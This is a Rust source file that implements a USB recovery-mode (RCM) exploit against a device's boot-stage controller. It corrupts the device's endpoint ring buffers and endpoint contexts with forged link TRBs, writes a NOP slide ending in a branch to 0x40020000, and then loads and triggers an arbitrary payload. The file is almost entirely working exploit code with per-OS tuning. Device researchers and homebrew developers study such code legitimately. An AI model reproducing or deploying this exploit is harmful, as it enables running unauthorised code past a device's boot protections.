use anyhow::{Context, bail};

use crate::device::RcmDevice;

pub const PAYLOAD_LOAD_ADDRESS: usize = 0x4002_0000;

const fn default_ep0_bump_count() -> usize {
    const {
        if cfg!(target_os = "linux") {
            21
        } else if cfg!(target_os = "macos") {
            19
        } else if cfg!(target_os = "windows") {
            24
        } else {
            panic!("Unsupported/Untested Host OS!")
        }
    }
}

const fn bpmp_to_hw_sysram_address(bpmp_address: u32) -> u32 {
    bpmp_address.wrapping_sub(0x1000_0000)
}

fn write_ep_ctx(ctx: &mut [u8], d1: u32, ring_address: u32) {
    ctx[0..4].copy_from_slice(&1u32.to_le_bytes());
    ctx[4..8].copy_from_slice(&(d1 | 6).to_le_bytes());
    ctx[8..12].copy_from_slice(&(ring_address | 1).to_le_bytes());
    ctx[16..20].copy_from_slice(&8u32.to_le_bytes());
    ctx[24..28].copy_from_slice(&0xc0000u32.to_le_bytes());
}

pub fn hax(
    device: &mut RcmDevice,
    payload: &[u8],
    ep0_bump_count: Option<usize>,
) -> anyhow::Result<()> {
    device.write(&0x500u32.to_le_bytes())?;
    device.log_written("header length field");
    device.write_until(0x4000_2200)?;
    device.log_written("until Ep0 Ring Buffer");

    let ep0_bump_count = ep0_bump_count.unwrap_or_else(default_ep0_bump_count);
    for _ in 0..ep0_bump_count {
        device.bump_ep0_ring()?;
    }

    for idx in 0..15 {
        device.write_length(0x10)?;

        device.bump_ep0_ring().with_context(|| {
            format!(
                "Device died on Ep0 Ring Poke {idx}, try adding the argument \"-o {}\"",
                ep0_bump_count + idx
            )
        })?;
    }
    device.log_written("Ep0 Ring Entries");
    device.send_link_trb(bpmp_to_hw_sysram_address(0x0d48_1c40))?;
    device.log_written("Ep0 LinkTRB");

    device.do_svc().context("Ep0 died on first poke")?;

    let mut ep0_poke_idx = 1;
    loop {
        tracing::debug!("Ep0 poke {ep0_poke_idx}");
        if device.unstall_ep1_out().is_err() {
            tracing::debug!("Ep0 successfully died on poke {ep0_poke_idx}");
            break;
        }

        ep0_poke_idx += 1;

        #[cfg(windows)]
        if ep0_poke_idx >= 16 {
            tracing::debug!("Guessing EP0 died by now, yay for windows!");
            break;
        }

        #[cfg(not(windows))]
        if ep0_poke_idx >= 32 {
            bail!("Ep0 didn't die??")
        }
    }

    for idx in 0..14 {
        tracing::debug!("Ep1 poke {idx}");
        device.bump_ep1_out_ring()?;
    }

    for entry in 0..15 {
        device
            .write_length(0x10)
            .with_context(|| format!("Writing Ep1Out Ring Entry {entry}"))?;
    }
    device.log_written("Ep1Out Ring Entries");
    device.send_link_trb(bpmp_to_hw_sysram_address(0x4000_2300))?;
    device.log_written("Ep1Out LinkTRB");

    let mut ctxs = [0u8; 0x200];
    write_ep_ctx(
        &mut ctxs[0x100..],
        0x20 | 0x0400000,
        bpmp_to_hw_sysram_address(0x4000_2200),
    );
    write_ep_ctx(
        &mut ctxs[0x180..],
        0x10 | 0x2000000,
        bpmp_to_hw_sysram_address(0x4000_2300),
    );
    write_ep_ctx(
        &mut ctxs[0x1C0..],
        0x30 | 0x2000000,
        bpmp_to_hw_sysram_address(0x4000_2400),
    );
    device.write(&ctxs)?;
    device.log_written("EpCtxs");

    assert_eq!(device.current_address(), 0x40002600);
    let nop_slide_and_branch: [u8; 0x204] = std::array::from_fn(|idx| match idx {
        0x200 => 0x1D,
        0x201 => 0xF0,
        0x202 => 0xFE,
        0x203 => 0xEB, // BLX #0x40020000
        idx if idx & 1 != 0 => 0xBF,
        _ => 0,
    });
    device.write(&nop_slide_and_branch)?;
    device.log_written("NOP Slide");

    device.write_until(PAYLOAD_LOAD_ADDRESS as u32)?;
    device.log_written("until payload load address");

    device.write(payload)?;
    device.log_written("payload");

    if device.do_svc().is_ok() {
        bail!("Ep0 is alive again??");
    }

    Ok(())
}
